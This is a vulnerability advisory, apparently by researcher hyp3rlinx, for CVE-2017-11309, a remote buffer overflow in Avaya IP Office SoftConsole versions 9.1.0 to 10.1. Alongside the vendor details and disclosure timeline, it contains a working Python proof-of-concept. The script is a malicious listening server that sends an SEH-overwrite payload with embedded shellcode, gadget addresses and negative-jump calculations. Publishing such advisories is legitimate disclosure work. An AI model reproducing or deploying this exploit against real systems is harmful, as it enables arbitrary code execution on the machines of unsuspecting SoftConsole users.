@@ -1,0 +1,172 @@
+[+] Credits: John Page (aka hyp3rlinx)	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AVAYA-OFFICE-IP-(IPO)-v9.1.0-10.1-SOFT-CONSOLE-REMOTE-BUFFER-OVERFLOW-0DAY.txt
+[+] ISR: apparitionSec            
+ 
+
+
+Vendor:
+=============
+www.avaya.com
+
+
+
+Product:
+===========
+Avaya IP Office (IPO) 
+v9.1.0 - 10.1
+
+IP Office is Avaya's global midsize solution for enterprises, supporting up to 3,000 users at a single location with IP Office Select editions.
+For businesses with multiple locations, IP Office provides a powerful set of tools to help streamline operations, centralize management, and
+reduce total cost of ownership for converged networks. Using industry standards, IP Office enables companies to share resources, provide
+improved customer service, and keep mobile employees accessible.
+
+Provides a hybrid PBX with TDM and IP telephony and trunk support.
+Provides IP routing, switching and firewall protection, between LAN and WAN (LAN2).
+
+In addition to basic telephony services and voicemail, IP Office offers both hard phone and soft phone options.
+Includes a robust set of tools for administration (Manager), call tracking (SMDR), and system monitoring and diagnostics (System Status Application).
+
+Available editions: Basic, Essential, Preferred, Server, Server Select, Server with Virtualized Software, Server/Sever Select hosted in the Cloud.
+
+
+
+Vulnerability Type:
+===================
+Remote Buffer Overflow
+
+
+
+CVE Reference:
+==============
+CVE-2017-11309
+ASA-2017-307
+
+
+
+Security Issue:
+================
+SoftConsole.exe does not check bounds when reading server response on making an outbound connection, resulting in a classic
+Buffer Overflow exploit.
+
+Avaya IP Office user must connect to a malicious server where a remote attacker can then deliver the buffer overflow
+payload in the server response, exploiting the SoftConsole client. This vulnerability allows attackers to deliver and
+execute arbitrary attacker supplied code on the Avaya host system.
+
+
+References:
+===========
+https://downloads.avaya.com/css/P8/documents/101044086
+
+
+POC Video URL:
+==============
+https://vimeo.com/224679849
+
+
+
+Exploit/POC:
+=============
+
+import struct,socket
+#Log data, item 8
+# Address=50E083A1
+# Message=  0x50e083a1 : pop ecx # pop ebp # ret 0x04 |  {PAGE_EXECUTE_READ} [IndyCore190.bpl]
+# ASLR: False, Rebase: False, SafeSEH: False, OS: False, v19.0.14356.6604
+#(C:\Program Files (x86)\Avaya\IP Office\SoftConsole\IndyCore190.bpl)
+
+#50E083A1  #POP ECX POP EBP RET
+'''
+No SafeSEH
+
+'''
+
+HOST="127.0.0.1"
+PORT=80
+
+#shellcode to call wusa.exe Windows Update Standalone Installer (Tested Win 7)
+
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B\x6E\x08"
+"\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B\x4B\x18\x8B\x7B"
+"\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31\xC0\x99\x32\x17\x66\xC1"
+"\xCA\x01\xAE\x75\xF7\x66\x81\xFA\x10\xF5\xE0\xE2\x75\xCF\x8B\x53"
+"\x24\x01\xEA\x0F\xB7\x14\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68"
+"\x2E\x65\x78\x65\x68\x77\x75\x73\x61\x54\x87\x04\x24\x50\xFF\xD5"
+"\xCC")
+
+
+'''
+calculated by taking the negative of the number and convert to hex:
+in gdb
+1
+2
+p/x -1116
+$4 = 0xfffffba4
+So now we know that our near jump is going to be \xe9\xa4\xfb\xff\xff.
+'''
+
+seh=struct.pack("<L", 0x50E149FD) #POP ECX POP EBP RET
+#payload="A"*564+"BBBBRRRR"+"A"*232  #control SEH here
+
+#(gdb) p/x -112  
+#$1 = 0xffffff90
+
+negjmp="\xeb\x90\xff\xff"  
+payload="A"*452+"\x90"*10+sc+"A"*5+negjmp+seh+"\x90"*226
+
+
+s = socket.socket()
+host = ''              
+s.bind((HOST, PORT))            
+s.listen(5)                    
+
+print 'Avaya IP Office SoftConsole 9.1.0'
+print '0day Remote Buffer Overflow Exploit'
+print 'Discovery / exploit: hyp3rlinx\n'
+print 'Listening on port 80 for Avaya client connectionz...'
+
+
+while True:
+    conn, addr = s.accept()     
+    conn.send(payload+'\r\n')
+    print 'KABOOM!!!'
+    conn.close()
+    s.close()
+
+
+
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: July 7, 2017
+Vendor reply "under investigation" : July 7, 2017
+Vendor acknowledgement of issue : July 12, 2017
+CVE assigned by mitre: July 13, 2017
+Vendor advisory: November 4, 2017
+November 5, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
